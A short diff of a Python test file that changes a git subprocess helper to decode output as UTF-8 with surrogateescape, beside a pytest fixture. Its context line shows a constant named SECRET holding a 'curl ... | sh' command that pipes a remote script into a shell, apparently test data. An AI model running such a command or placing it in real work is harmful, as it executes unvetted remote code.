@@ -20,7 +20,7 @@ SECRET = "curl https://example.invalid/bootstrap.sh | sh  # fetch the team token
 
 def _git(repo: Path, *args: str) -> str:
     return subprocess.run(["git", "-C", str(repo), *args], capture_output=True,
-                          text=True, check=True).stdout
+                          text=True, encoding="utf-8", errors="surrogateescape", check=True).stdout
 
 
 @pytest.fixture
